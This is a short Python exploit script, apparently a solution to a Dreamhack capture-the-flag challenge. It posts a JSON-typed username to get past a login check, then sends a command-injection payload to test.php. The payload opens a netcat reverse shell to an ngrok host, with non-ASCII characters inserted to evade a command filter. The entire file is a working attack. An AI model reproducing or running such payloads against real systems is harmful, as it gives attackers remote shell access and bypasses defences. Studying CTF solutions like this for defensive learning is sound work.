from requests import Session

URL = "http://host3.dreamhack.games:11643"

## Setting username 'true'
data = {"username": '{"username":true}'}

## Command Execution Payload with non ascii character
CMD = "nㅁc -e /bㅁin/basㅁh tcp://0.tcp.jp.ngrok.io 14701"

sess = Session()
sess.post(f"{URL}/", data=data)
res = sess.get(f"{URL}/test.php?cmd={CMD}")

